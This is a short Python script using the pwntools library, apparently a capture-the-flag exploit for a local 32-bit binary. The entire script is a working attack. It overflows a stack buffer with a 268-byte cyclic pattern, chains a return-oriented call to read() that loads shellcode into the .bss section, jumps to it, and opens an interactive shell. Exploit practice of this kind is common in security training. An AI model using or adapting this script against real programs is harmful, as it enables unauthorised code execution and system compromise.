from pwn import *
import sys

def exploit():
	p1 =  cyclic(268)
	p1 += flat(elf.plt['read'], p3r, 0, elf.bss() + 0x500, len(shellcode) + 1)
	p1 += flat(elf.bss() + 0x500)

	p.sendline(p1)
	p.sendline(shellcode)
	p.interactive()

def main():
	global b, l, elf, p, p1r, p3r, shellcode

	# context.log_level = 'debug'

	b   = './binary'
	l   = './libc.so.6'
	elf = ELF(b)
	p = process(b)
	# p = process(b, env={'LD_PRELOAD' : l})
	# p = remote('localhost', 8888)

	p1r = 0x08048375
	p3r = 0x08048619
	shellcode = asm(shellcraft.i386.linux.sh(), arch='i386')

	exploit()

if __name__ == '__main__':
	main()
